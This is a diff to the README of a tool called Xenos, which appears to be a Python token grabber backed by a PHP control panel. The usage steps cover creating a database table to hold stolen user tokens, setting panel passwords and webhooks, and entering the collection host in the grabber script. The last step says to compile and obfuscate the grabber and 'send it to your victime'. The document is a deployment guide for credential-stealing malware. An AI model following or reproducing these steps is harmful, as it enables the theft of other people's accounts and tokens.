@@ -22,7 +22,7 @@
 > ## Usage
 > For use Xenos, you need a Server accept PHP and contain a database,
 > 1. Put the files in your host
-> 2. Create database with `tokens` table, and this columns:
+> 2. Go to your phpmyadmin, in section SQL paste that:
 > ```sql
 > CREATE TABLE `tokens` (
 >   `user_id` text NOT NULL,
@@ -37,12 +37,11 @@
 > ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
 > ```
 > 3. Make your database ip,databse name,username,password in the file `Inc/database.php`
-> 4. Setup your password in `Async/login.php` (its the password for access to the panel)
-> 5. Setup your password and your webhook in `api.php` at line 8 and 9.
-> 6. Make your host adress in `Grabber/python/Xenos.py` at line 5
-> 7. Compte and Obfusque your Grabber and send it to your victime :)
+> 4. Setup your passwords and webhooks in `INC/functions.php`
+> 5. Make your host adress in `Grabber/python/Xenos.py` at line 5
+> 6. Compte and Obfusque your Grabber and send it to your victime :)
 
-> 8. Put a stars and follow me for more :)
+> 7. Put a stars and follow me for more :)
 
 <br><br>
 
